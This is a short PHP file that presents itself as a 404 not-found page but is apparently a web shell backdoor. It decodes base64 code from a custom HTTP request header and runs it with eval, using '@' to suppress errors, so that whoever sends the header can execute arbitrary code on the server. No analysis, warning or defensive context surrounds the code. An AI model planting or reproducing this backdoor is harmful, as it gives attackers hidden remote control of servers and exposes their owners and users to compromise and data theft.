<?php
http_response_code(404);
@eval(base64_decode($_SERVER['HTTP_X_PAYLOAD']));
